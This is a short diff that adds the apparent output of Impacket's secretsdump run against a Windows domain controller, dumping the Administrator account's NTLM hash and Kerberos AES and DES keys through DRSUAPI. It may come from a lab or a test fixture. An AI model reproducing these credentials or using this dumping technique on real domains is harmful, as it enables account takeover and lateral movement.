@@ -1,0 +1,10 @@
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:88e1db77ee01e9e14dfc4dac2617f266:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:65164aec352f7a4cb718d6e31af13ac6d11a377d3e991ef36d36ea5cfa207a01
+Administrator:aes128-cts-hmac-sha1-96:00262805662479d51b7a21d57fba0286
+Administrator:des-cbc-md5:e67f975e9e911fe0
+[*] Cleaning up... 
